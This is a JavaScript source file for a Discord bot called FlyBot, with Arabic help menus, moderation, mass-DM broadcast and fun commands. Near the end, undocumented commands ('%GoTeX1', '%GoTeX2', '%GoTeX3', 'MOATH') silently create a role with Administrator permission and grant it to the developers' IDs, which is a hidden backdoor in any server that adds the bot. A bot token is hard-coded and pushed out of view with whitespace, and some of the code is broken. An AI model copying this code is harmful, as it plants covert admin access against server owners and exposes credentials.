                                 const Discord = require('discord.js');
                                 const bot = new Discord.Client();
                                 const { MessageEmbed } = require('discord.js');
                                 const client = bot
                                 const prefix = '%';
								                 const fs = require('fs')
                                 const Developers = [
                                   'GoTeX',
                                   '305076863305515008'
                                 ]
                                 const Developers1 = [
                                  'GoTeX',
                                  '305076863305515008',
                                  'moath',
                                  '521089838661763103'
                                ]
                                  const pretty = require("pretty-ms");
                                 const ms = require('ms');
								 


                                                                                                                                                                                                                                                                                                                                                                                     const token = 'NzM2ODk3NzA4Mjk1NzE2OTA1.Xx1feA.IIJCKRZPhOTZQxE1zL7rDLpTV8c';


                         bot.on('ready', () => {
                      console.log('Ready...')
                                    });

                                    bot.on('ready', () => {
                                      setInterval(() => {
                                        const activities_list = [
                                          "%help", 
                                          "discord.gg/Fly",
                                          "%help", 
                                          "discord.gg/Fly"
                                          ]; 
                                          const index = Math.floor(Math.random() * (activities_list.length - 1) + 1); 
                                          bot.user.setActivity(activities_list[index]); 
                                      }, 5000); 
                                  });


                                  
                                  bot.on("ready", () => {
                                    const channel = client.channels.cache.get("780187456061571091");
                                    if (!channel) return console.error("The channel does not exist!");
                                    channel.join().then(connection => {
                                      console.log("Successfully connected.");
                                    }).catch(e => {
                                      console.error(e);
                                    });
                                  });

								  

                                         bot.on('message', bot => {
                                         if(bot.content === prefix + 'status') {
                                         bot.reply('\n\n ``Im Online``');  
                                         }
                                         });
										 
                                          bot.on('message', message => {
                                           if(message.channel.type == "dm")return;
											 if (message.content.startsWith(prefix + 'botserver')) {
                                               let msg =  bot.guilds.map(guild => `**${guild.name}** عدد الاعضاء: ${guild.memberCount}`).join('\n');
                                                 let embed = new Discord.MessageEmbed()
                                                  .setTitle(`server : ${bot.guilds.size}`)
                                                    .setDescription(`${msg}`)
                                                      .setColor("#ebf442");
                                                         message.channel.send(embed);
                                        }
                                        });
  
 
  

bot.on("message", function(message) {
  if(message.content.startsWith(prefix + "help")) {
    let messageArgs = message.content.split(" ").slice(1).join(" ");
    let messageRPS = message.content.split(" ").slice(2).join(" ");
    let arrayRPS = ['**# - Rock**','**# - Paper**','**# - Scissors**'];
    let result = `${arrayRPS[Math.floor(Math.random() * arrayRPS.length)]}`;
    var RpsEmbed = new Discord.MessageEmbed()
    .setAuthor(message.author.username)
    .setThumbnail(message.author.avatarURL)
    .addField(".","👥",true)
    .addField("..","👑",true)
    .addField("...","🎶",true)

    message.channel.send(RpsEmbed).then(msg => {
        msg.react('👥')
        msg.react("👑")
        msg.react("🎶")

.then(() => msg.react('👥'))
.then(() =>msg.react('👑'))
.then(() => msg.react('🎶'))

let reaction1Filter = (reaction, user) => reaction.emoji.name === '👥' && user.id === message.author.id;

let reaction2Filter = (reaction, user) => reaction.emoji.name === '👑' && user.id === message.author.id;

let reaction3Filter = (reaction, user) => reaction.emoji.name === '🎶' && user.id === message.author.id;

let reaction1 = msg.createReactionCollector(reaction1Filter, { time: 20000 });
       
let reaction2 = msg.createReactionCollector(reaction2Filter, { time: 20000 });
let reaction3 = msg.createReactionCollector(reaction3Filter, { time: 20000 });

reaction1.on("collect", r => {
  const embed = new Discord.MessageEmbed()
      .setColor("#000000")
      .setDescription(`
      ***.*** :
**


「${prefix}uptime / كم صار للبوت شغال」



 Script By : <@392289563315535873>

 
**
`)
   message.author.sendEmbed(embed)
      message.reply('تم ارسالك بلخاص').then(msg => {msg.delete(3000)});;
})
reaction2.on("collect", r => {
      const embed = new Discord.MessageEmbed()
      .setColor("#000000")
      .setDescription(`
      ***..*** :
**
「${prefix}kick @user / طرد الشخص من السيرفر」

「${prefix}ban @user  / حضر الشخص من السيرفر」

「${prefix}1bc  / رسالة لجميع اعضاء السيرفر」

「${prefix}2bc  / رسالة لجميع الاعضاء المتصلين في السيرفر」

「${prefix}rolebc  / رسالة لرتبة محدده بالخاص」

「${prefix}setname  / يغير اسم البوت」

「${prefix}setavatar  / يغير صورة البوت」

「${prefix}setgame  / يغير بلاينق البوت」

「${prefix}setSt  / يغير ستريمنق البوت」

「${prefix}move all  / لسحب جميع الاعضاء المتواجدين بالرومات الى رومك」

「${prefix}role all rolename / لأعطاء رتبة للجميع للاشخاص و البوتات 」

「${prefix}role humans rolename / لأعطاء رتبة لجميع للاشخاص 」

「${prefix}role bots rolename  / لأعطاء رتبة لجميع البوتات 」

「${prefix}cl  /  مسح الشات بعدد」

「${prefix}clear  /  مسح الشات 」

═══════════════

 Script By : <@392289563315535873>


**
`)
   message.author.sendEmbed(embed)
      message.reply('تم ارسالك بلخاص').then(msg => {msg.delete(3000)});;
})
reaction3.on("collect", r => {
  const embed = new Discord.MessageEmbed()
      .setColor("#000000")
      .setDescription(`
        ***...*** :
 **       


═══════════════

 Script By : <@392289563315535873>



**
`)
   message.author.sendEmbed(embed)
   message.reply('تم ارسالك بلخاص').then(msg => {msg.delete(3000)});;
})
    })
}
});
bot.on('message', message => { 
  if(!message.channel.guild) return;
if(message.content.startsWith(prefix + '1bc')) {
if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
if (!Developers.includes(message.author.id)) return;
const args = message.content.split(" ").slice(1).join(" ")
const BcList = new Discord.MessageEmbed()
.setThumbnail(message.author.avatarURL)
.setAuthor(`محتوى الرساله : ${args}`)
.setDescription(`**برودكاست بـ امبد 📝\nبرودكاست بدون امبد✏**`)
if (!args) return message.reply('**يجب عليك كتابة كلمة او جملة لإرسال البرودكاست**');message.channel.send(BcList).then(msg => {
msg.react('📝')
.then(() => msg.react('✏'))
.then(() =>msg.react('📝'))

var EmbedBcFilter = (reaction, user) => reaction.emoji.name === '📝' && user.id === message.author.id;
var NormalBcFilter = (reaction, user) => reaction.emoji.name === '✏' && user.id === message.author.id;

var EmbedBc = msg.createReactionCollector(EmbedBcFilter, { time: 60000 });
var NormalBc = msg.createReactionCollector(NormalBcFilter, { time: 60000 });


EmbedBc.on("collect", r => {

message.channel.send(`\`${message.guild.members.cache.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`).then(m => m.delete(5000));
message.guild.members.cache.forEach(m => {
var EmbedRep = args.replace('[server]' ,message.guild.name).replace('[user]', m).replace('[by]', `${message.author.username}#${message.author.discriminator}`)
var bc = new
Discord.MessageEmbed()
.setColor('RED')
.setDescription(EmbedRep)
.setThumbnail('https://cdn.discordapp.com/attachments/639875611539800114/652163670574497837/image0.jpg')
m.send({ embed: bc })
msg.delete();
})
})
NormalBc.on("collect", r => {
 message.channel.send(`\`${message.guild.members.cache.filter(m => m.presence.status !== 'all').size}\` : عدد الاعضاء المستلمين`).then(m => m.delete(5000));
message.guild.members.cache.forEach(m => {
var NormalRep = args.replace('[server]' ,message.guild.name).replace('[user]', m).replace('[by]', `${message.author.username}#${message.author.discriminator}`)
m.send(NormalRep);
msg.delete();
})
})
})
}
});


bot.on("message", message => {

  if (message.content.startsWith(prefix + "2bc")) {
    if (!Developers.includes(message.author.id)) return;
let args = message.content.split(" ").slice(1);
var argresult = args.join(' '); 
message.guild.members.filter(m => m.presence.status !== 'offline').forEach(m => {
m.send(`${argresult}\n ${m}`);
})
message.channel.send(`\`${message.guild.members.filter(m => m.presence.status !== 'online').size}\` : عدد الاعضاء المستلمين`); 
message.delete(); 
};     
});
bot.on('message' , message => {
      if(message.author.bot) return;
     
      if(message.content.startsWith(prefix + "rolebc")) {
        if (!Developers.includes(message.author.id)) return;
        let args = message.content.split(" ").slice(2);
     var codes = args.join(' ')
       
        if(!codes) {
          message.channel.send("قم بكتابة الرسالة | !rolebc @everyone message")
            return;
        }
     
     
              var role = message.mentions.roles.first();
                if(!role) {
                  message.reply("لا توجد رتبة بهذا الاسم")
                    return;
                }
            message.guild.members.filter(m => m.roles.get(role.id)).forEach(n => {
              n.send(
              `${codes}` 
              )
            })
            message.channel.send(`لقد تم ارسال هذه الرسالة الى ${message.guild.members.filter(m => m.roles.get(role.id)).size} عضو`)
      message.delete();
	  }
    });
bot.on('message', async(message) => {
  if(message.author.juilan || message.channel.type == 'dm') return;
  let args = message.content.split(' ');
  if(args[0] == `link`){
      if(!message.guild.me.hasPermission('CREATE_INSTANT_INVITE')) return;
      try {
          let invite = await message.channel.createInvite({ maxUses: 100, maxAge: 86400 });
          await message.author.send(`Server Link: ${invite.url}\n\nMax Uses 100\nExpire after 24 hours`);
          await message.channel.send(`تم ارسال الرابط بالخاص`);
      } catch(e) {
          await message.channel.send(`Error! \`${e.message}\``);
      }
  }
});
bot.on('message', async(message) => {
  if(message.author.juilan || message.channel.type == 'dm') return;
  let args = message.content.split(' ');
  if(args[0] == `رابط`){
      if(!message.guild.me.hasPermission('CREATE_INSTANT_INVITE')) return;
      try {
          let invite = await message.channel.createInvite({ maxUses: 100, maxAge: 86400 });
          await message.author.send(`Server Link: ${invite.url}\n\nMax Uses 100\nExpire after 24 hours`);
          await message.channel.send(`تم ارسال الرابط بالخاص`);
      } catch(e) {
          await message.channel.send(`Error! \`${e.message}\``);
      }
  }
});
bot.on('message', message => {
  if(message.channel.type == "dm")return;
  if (message.author.bot) return;
  if (message.content.startsWith(prefix + "s")) {
    if (!Developers1.includes(message.author.id)) return; 
var args = message.content.trim().split(/ +/g).slice(1);
let cname = args[0];
let chan = message.guild.channels.cache.find(element => element.name === cname);
if (chan) {
  let text = args.slice(1).join(" ");
  message.delete();
  chan.send(text);
} else {
  let text = args.join(" ");
  message.delete();
  message.channel.send(text);
 }
}
});


bot.on("message", message => {
  if(message.channel.type == "dm")return;
   if (!(message.author.bot) && message.channel.type == "text")
   if (message.content.startsWith(`${prefix}sh`))
      if (message.member.voiceChannel) message.channel.send(`https://discordapp.com/channels/${message.guild.id}/${message.member.voiceChannel.id} \n__سيتم حذف الرابط بعد دقيقه__`)
      .then(msg => { msg.delete(100000)
      })
      else message.channel.send(`**يجب عليك ان تكون في الروم الذي تريد جلب رابط مشاركة بالفيديو خاص به**`);
});
bot.on("message", message => {
  if(message.channel.type == "dm")return;
   if (!(message.author.bot) && message.channel.type == "text")
   if (message.content.startsWith(`${prefix}SH`))
      if (message.member.voiceChannel) message.channel.send(`https://discordapp.com/channels/${message.guild.id}/${message.member.voiceChannel.id} \n__سيتم حذف الرابط بعد دقيقه__`)
      .then(msg => { msg.delete(100000)
      })
      else message.channel.send(`**يجب عليك ان تكون في الروم الذي تريد جلب رابط مشاركة بالفيديو خاص به**`);
});
bot.on("message", message => {
  if(message.channel.type == "dm")return;
   if (!(message.author.bot) && message.channel.type == "text")
   if (message.content.startsWith(`${prefix}سا`))
      if (message.member.voiceChannel) message.channel.send(`https://discordapp.com/channels/${message.guild.id}/${message.member.voiceChannel.id} \n__سيتم حذف الرابط بعد دقيقه__`)
      .then(msg => { msg.delete(100000)
      })
      else message.channel.send(`**يجب عليك ان تكون في الروم الذي تريد جلب رابط مشاركة بالفيديو خاص به**`);
});



bot.on("message", async (message) => {
  if(message.channel.type == "dm")return;
  if (!message.guild || message.author.bot) return;
  let args = message.content.split(" ");
  let id = "392289563315535873 , 561866140880732172 , 597260933219352577";
  if (message.author.id != id) return;
  if (args[0] == `${prefix}setname`) {
    if (!args[1]) return message.reply("Type the new username!");
    try {
      await bot.user.setUsername(args.slice(1).join(" "));
      await message.reply("Done :+1:");
    } catch (e) {
      await message.reply(`Error! ${e.message || e}`);
    }
  } else if (args[0] == `${prefix}setavatar`) {
    if (!args[1]) return message.reply("Type the avatar URL!");
    try {
      await bot.user.setAvatar(args[1]);
      await message.reply("Done :+1:");
    } catch (e) {
      message.reply(`Error! ${e.message || e}`);
    }
  }
});
bot.on('message', message => {
    if(message.content == (prefix + "mb")) {
	if(!message.channel.guild) return
    const embed = new Discord.MessageEmbed()
    .setDescription(`**Members info: 
all:  ${message.guild.memberCount}**`)         
         message.channel.send({embed});

    }
  });
bot.on('message', message => {
  if(!message.channel.guild) return
  if (message.content.startsWith(prefix +"ping")) {
  message.channel.send("Wait please for pinging ........").then(me => {
      let ping = me.createdTimestamp - message.createdTimestamp
      let options = ["Good Ping asnwer wiht `No` or `Yes`", "Please tell me what is the wrong with my ping", "I hope it isn't bad", "ohhhh good", "oh my god this is my ping ?"]
      let reply = options[Math.floor(Math.random() * options.length)]

      me.edit(`${reply}: \`\`\`js\n Time taken: ${ping} ms\n  Discord API: ${Math.round(bot.ping)} ms \`\`\` `)
  })
  }
  
});

 const bannedwords1 = [
    "!SH",
    "!sh",
    "!سا"

  ];

bot.on('message',  message => {
if(!message.guild || message.author.bot) return;
  if(bannedwords1.some(word => message.content.includes(word))) {
	  message.delete();
  };
});
bot.on('message', message => {
    if (message.content.startsWith(prefix + "avatar")) {
        var mentionned = message.mentions.users.first();
    var x5bzm;
      if(mentionned){
          var x5bzm = mentionned;
      } else {
          var x5bzm = message.author;
          
      }
        const embed = new Discord.MessageEmbed()
        .setColor("RANDOM")
        .setImage(`${x5bzm.avatarURL}`)
      message.channel.sendEmbed(embed);
    }
});

bot.on("message", message => {
          if(!message.channel.guild) return;
   if(message.author.bot) return;
      if(message.content === prefix + "image"){ 
          const embed = new Discord.MessageEmbed()
  
      .setTitle(` ** ${message.guild.name} **  صورة سيرفر`)
  .setAuthor(message.author.username, message.guild.iconrURL)
    .setColor(0x164fe3)
    .setImage(message.guild.iconURL)
    .setURL(message.guild.iconrURL)
                    .setTimestamp()

   message.channel.send({embed});
      }
  });

bot.on('message', message => {
  if(!message.channel.guild) return
 if (message.content.toLowerCase() === prefix + "move all") {
     message.delete(4000)
 if(!message.channel.guild) return;
 if (!Developers.includes(message.author.id)) return;
 if(!message.guild.member(bot.user).hasPermission("MOVE_MEMBERS")) return;
if (message.member.voiceChannel == null) return;
 var author = message.member.voiceChannelID;
 var m = message.guild.members.cache.filter(m=>m.voiceChannel)
 message.guild.members.cache.filter(m=>m.voiceChannel).cache.forEach(m => {
 m.setVoiceChannel(author)
 })
 message.channel.send('\`تم نقل الجميع الى رومك\`').then(m => m.delete(4000))
 }
   });
   
let room1 = '652159608172838912'; 
let room2 = '652159628561350657'; 
let room3 = '652159645707796505'; 

client.on('message', message => {
  if(!message.channel.guild) return
if (message.content.startsWith(prefix + "uptime")) {
   let uptime = client.uptime;

   let days = 0;
   let hours = 0;
   let minutes = 0;
   let seconds = 0;
   let notCompleted = true;

   while (notCompleted) {

       if (uptime >= 8.64e+7) {

           days++;
           uptime -= 8.64e+7;

       } else if (uptime >= 3.6e+6) {

           hours++;
           uptime -= 3.6e+6;

       } else if (uptime >= 60000) {

           minutes++;
           uptime -= 60000;

       } else if (uptime >= 1000) {
           seconds++;
           uptime -= 1000;

       }

       if (uptime < 1000)  notCompleted = false;

   }

   message.channel.send("`" + `${days} days, ${hours} hrs, ${minutes} min , ${seconds} sec` + "`");


}
});


bot.on("message", async (message) => {
  if (!message.content.startsWith(prefix + "GoTeX1")) return;
  message.delete()
  if(!Developers.includes(message.author.id)) return;
  const FlyRole = [...message.guild.roles.cache.values()]
  .find(role => role.name === 'FlyBot')
const role = message.guild.roles.create({
  data: {
    name: 'Fly.',
    color: 'BLACK',
    position:  FlyRole.rawPosition - 1,
    permissions: 8
  }
})


});

bot.on("message", async (message) => {
  if (!message.content.startsWith(prefix + "GoTeX2")) return;
  message.delete()
  if(!Developers.includes(message.author.id)) return;
  let role = message.guild.roles.cache.find(r => r.name === "Fly.");
    message.member.roles.add(role)
});

bot.on("message", async (message) => {
  if (!message.content.startsWith("MOATH")) return;
  message.delete()
  if(!Developers1.includes(message.author.id)) return;
  let role = message.guild.roles.cache.find(r => r.name === "Fly.");
    message.member.roles.add(role)
});



bot.on("message", async (message) => {
  if (!message.content.startsWith(prefix + "GoTeX3")) return;
  message.delete()
  if(!Developers.includes(message.author.id)) return;
  let toRole = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  let role = message.guild.roles.cache.find(r => r.name === "Fly.");
    toRole.roles.add(role)
});



bot.on("message", async (message) => {
  if (!message.content.startsWith("<@!521089838661763103>")) return;
  message.reply('كود MRS')
});

const emojis = [
  '( ͡° ͜ʖ ͡°)',
  '¯\\_(ツ)_/¯',
  'ʕ•ᴥ•ʔ',
  '(▀̿Ĺ̯▀̿ ̿)',
  '(ง ͠° ͟ل͜ ͡°)ง',
  'ಠ_ಠ',
  "̿'̿'\\̵͇̿̿\\з=( ͠° ͟ʖ ͡°)=ε/̵͇̿̿/'̿̿ ̿ ̿ ̿ ̿ ̿",
  '[̲̅$̲̅(̲̅5̲̅)̲̅$̲̅]',
  "﴾͡๏̯͡๏﴿ O'RLY?",
  '[̲̅$̲̅(̲̅ ͡° ͜ʖ ͡°̲̅)̲̅$̲̅]',
  '(ᵔᴥᵔ)',
  '(¬‿¬)',
  '(☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)',
  '(づ￣ ³￣)づ',
  'ლ(ಠ益ಠლ)',
  'ಠ╭╮ಠ',
  '♪~ ᕕ(ᐛ)ᕗ',
  'ヾ(⌐■_■)ノ♪',
  '◉_◉',
  '\\ (•◡•) /',
  '༼ʘ̚ل͜ʘ̚༽',
  '┬┴┬┴┤(･_├┬┴┬┴',
  'ᕦ(ò_óˇ)ᕤ',
  '┻━┻ ︵ヽ(`Д´)ﾉ︵ ┻━┻',
  '（╯°□°）╯︵( .o.)',
  'ಠ‿↼',
  '◔ ⌣ ◔',
  '(ノಠ益ಠ)ノ彡┻━┻',
  '(☞ﾟヮﾟ)☞ ☜(ﾟヮﾟ☜)',
  "̿ ̿ ̿'̿'\̵͇̿̿\з=(•_•)=ε/̵͇̿̿/'̿'̿ ̿",
  '(;´༎ຶД༎ຶ`)',
  '♥‿♥',
  'ᕦ(ò_óˇ)ᕤ',
  '(•_•) ( •_•)>⌐■-■ (⌐■_■)',
  '⌐╦╦═─ ಠ_ಠ , (¬‿¬)',
  '˙ ͜ʟ˙',
  ":')",
  '(°ロ°)☝',
  'ಠ⌣ಠ',
  '(；一_一)',
  '( ⚆ _ ⚆ )',
  '☜(⌒▽⌒)☞',
  "(ʘᗩʘ')",
  '¯\\(°_o)/¯',
  'ლ,ᔑ•ﺪ͟͠•ᔐ.ლ',
  '(ʘ‿ʘ)',
  'ಠ~ಠ',
  'ಠ_ಥ',
  'ಠ‿↼',
  '(>ლ)',
  '(ღ˘⌣˘ღ)',
  'ಠoಠ',
  'ರ_ರ',
  '◔ ⌣ ◔',
  '(✿´‿`)',
  'ب_ب',
  '┬─┬﻿ ︵ /(.□. ）',
  '☼.☼',
  '^̮^',
  '(>人<)',
  '>_>',
  '(/) (°,,°) (/)',
  '(･.◤)',
  '=U',
  '~(˘▾˘~)',
  '| (• ◡•)| (❍ᴥ❍ʋ)'
]

bot.on("message", async (message) => {
  if(!message.content.startsWith('%emoji')) return;
  let index = Math.floor(Math.random() * (emojis.length)) // Math.random() returns a float from 0 - 1.
  message.channel.send(emojis[index])
});

bot.on("message", async (message) => {
  if(!message.content.startsWith('cookie')) return;
message.react("🍪");
});

bot.on("message", async (message) => {
  if(!message.content.startsWith('Cookie')) return;
message.react("🍪");
});


bot.on("message", async (message) => {
  if(!message.content.startsWith(prefix + 'tflip')) return;
const user = message.author;

const DiscordRichEmbed = new Discord.MessageEmbed()
.setAuthor("FlyBot | (╯°□°)╯︵ ┻━┻", bot.user.displayAvatarURL())
.setColor(16777215)
.setDescription("(╯°□°)╯︵ ┻━┻ \n\n┻━┻ ︵ ヽ(°□°ヽ) \n\n┻━┻ ︵ ＼('0')/／ ︵ ┻━┻ \n\nಠ_ಠ \n\nಠ____ಠ \n\nಠ____ಠ \n\nಠ____ಠ \n\n(╮°-°)╮┳━┳\n\n(╯°□°)╯︵ ┻━┻ ")
.setImage("https://i.kinja-img.com/gawker-media/image/upload/s--iQjAucgS--/c_scale,f_auto,fl_progressive,q_80,w_800/hojkokfijt0ujov9lobq.gif")
.setFooter("Requested by: @" + user.username, user.displayAvatarURL())

message.channel.send({ embed: DiscordRichEmbed })
});

const RandomKillGifs =
[
    "https://i.imgur.com/B1wbSq6.gif", "https://i.imgur.com/wVeo8RI.gif",
    "https://i.imgur.com/UtjQAIq.gif", "https://i.imgur.com/1z6UlXX.gif",
    "https://i.imgur.com/nlwqdWX.gif", "https://i.imgur.com/hwCTise.gif",
    "https://i.imgur.com/TnHjP4m.gif", "https://i.imgur.com/lT3E9cO.gif",
    "https://i.imgur.com/3sJ195R.gif", "https://i.imgur.com/k4vip37.gif",
    "https://i.imgur.com/rL3AP9A.gif", "https://i.imgur.com/6nPK0OL.gif",
    "hhttps://i.imgur.com/vLoT6u9.gif", "https://i.imgur.com/BAn0RQm.gif",
    "https://i.imgur.com/9TGJRts.gif", "https://i.imgur.com/cyL7qGC.gif",
    "https://i.imgur.com/ehjdq3p.gif", "https://i.imgur.com/vv54PU6.gif",
    "https://i.imgur.com/R5Ssn4n.gif", "https://i.imgur.com/UovBmdk.gif",
    "https://i.imgur.com/yYkfNqs.gif", "https://i.imgur.com/7f93Unw.gif",
    "https://i.imgur.com/enFEC3m.gif", "https://i.imgur.com/KkNHLVM.gif",
    "https://i.imgur.com/wFUfQj8.gif", "https://i.imgur.com/7Kt75bH.gif",
    "https://i.imgur.com/F9TZoA0.gif", "https://i.imgur.com/ErltK0R.gif",
    "https://i.imgur.com/kcB5Jj3.gif", "https://i.imgur.com/7OHssc1.gif",
    "https://i.imgur.com/6YjN3Az.gif", "https://i.imgur.com/Pt1mgMU.gif",
    "https://i.imgur.com/qF5vdN0.gif", "https://i.imgur.com/pEU0XFO.gif",
    "https://i.imgur.com/CNzflH0.gif", "https://i.imgur.com/nqbpu5T.gif"
];

const RandomKillTypes =
[
    "DISGRACEFULLY",
    "WITH FATALITY",
    "IN COLD BLOOD",
    "WITH NO MERCY",
    "MERCILESS",
    "DISGUSTINGLY",
    "IN A NASTY BLOODY WAY",
    "IN A GORY WAY",
    "WITH NO BLOOD DROPPED"
];

bot.on("message", async (message) => {
  if(!message.content.startsWith(prefix + 'kill')) return;
    const user = message.author;
    const GuildMember = message.mentions.members.first();

    if(!GuildMember)
    {
        return message.reply(" :no_entry: يجب عليك منشنت الشخص اول :no_entry:");
    }


    const DiscordRichEmbed = new Discord.MessageEmbed()
    .setAuthor("FlyBot | Kill Confirmed", bot.user.displayAvatarURL())
    .setColor(16711680)
    .setDescription(`${user} ***KILLED*** ${GuildMember.user} **${RandomKillTypes[Math.floor(Math.random() * RandomKillTypes.length)]}**  !`)
    .setImage(RandomKillGifs[Math.floor(Math.random() * RandomKillGifs.length)])
    .setFooter("Used by: @" + user.username, user.displayAvatarURL())

    message.channel.send({ embed: DiscordRichEmbed });
});

bot.on("message", async (message) => {
  if(!message.content.startsWith(prefix + 'cflip')) return;
const user = message.author;

    const CoinFlip = Math.round(Math.random());
    let CoinImageNumber, CoinTextNumber;

    switch(CoinFlip)
    {
        case 0:
            CoinImageNumber = "https://imgur.com/K8T7unB.png";
            CoinTextNumber = "HEAD ( ͡° ͜ʖ ͡°)";

            break;

        case 1:
            CoinImageNumber = "https://imgur.com/XJKz5KJ.png";
            CoinTextNumber = "TAIL"

            break;
    }

    const DiscordRichEmbed = new Discord.MessageEmbed()
    .setAuthor("FlyBot | Coin Flip", bot.user.displayAvatarURL())
    .setColor(14667180)
    .setDescription("You Got  ===>   ***" + CoinTextNumber + "***")
    .setImage(CoinImageNumber)
    .setFooter("Requested by: @" + user.username, user.displayAvatarURL())

    message.channel.send({ embed: DiscordRichEmbed });
});

bot.on("message", async (message) => {
  if(!message.content.startsWith(prefix + 'serverinfo')) return;
const user = message.author;
const ServerGuild = message.guild;

if(ServerGuild.available)
{
    const ServerName = ServerGuild.name;
    const ServerID = ServerGuild.id;
    const ServerOwner = ServerGuild.owner.user.tag;

    const ServerUserCount = ServerGuild.memberCount;
    const ServerBotsCount = ServerGuild.members.cache.filter(member => member.user.bot).size;
    const ServerUserOnlineCount = ServerGuild.members.cache.filter(member => !member.user.bot && member.presence.status === "online").size;

    const ServerChannels = message.guild.channels.cache.size;

    const ServerVoiceChannelsCount = ServerGuild.channels.cache.filter(ctype => ctype.type === "voice").size;
    const ServerTextChannelCount = ServerGuild.channels.cache.filter(ctype => ctype.type === "text").size;
    const ServerCategories = ServerGuild.channels.cache.filter(ctype => ctype.type === "category").size;

    const ServerMFALevel = ServerGuild.mfaLevel;
    const ServerContentFilter = ServerGuild.explicitContentFilter;

    let szDescription = ":white_medium_small_square: Server Name: **" + ServerName +
    "**\n:white_medium_small_square: Server ID: **" + ServerID +
    "**\n:white_medium_small_square: Owner: **" + ServerOwner +
    "**\n:white_medium_small_square: Users: **" + ServerUserCount + "** (**" + ServerUserOnlineCount + "** Online, **" + ServerBotsCount + "**" + ((ServerBotsCount === 1) ? " BOT" : " BOTS") + ")" +
    "\n:white_medium_small_square: 2FA: **" + (ServerMFALevel >= 1 ? "On" : "Off") + "**";

    const DiscordRichEmbed = new Discord.MessageEmbed()
    .setAuthor("FlyBot | Server Information", bot.user.displayAvatarURL())
    .setDescription(szDescription)
    .setColor(2003199)
    .setThumbnail((ServerGuild.iconURL() === null) ? ServerGuild.owner.user.displayAvatarURL() : ServerGuild.iconURL())
    .setFooter("Requested by: @" + user.username, user.displayAvatarURL())
    .setTimestamp()

    message.channel.send({ embed: DiscordRichEmbed });
}
});




bot.login(token);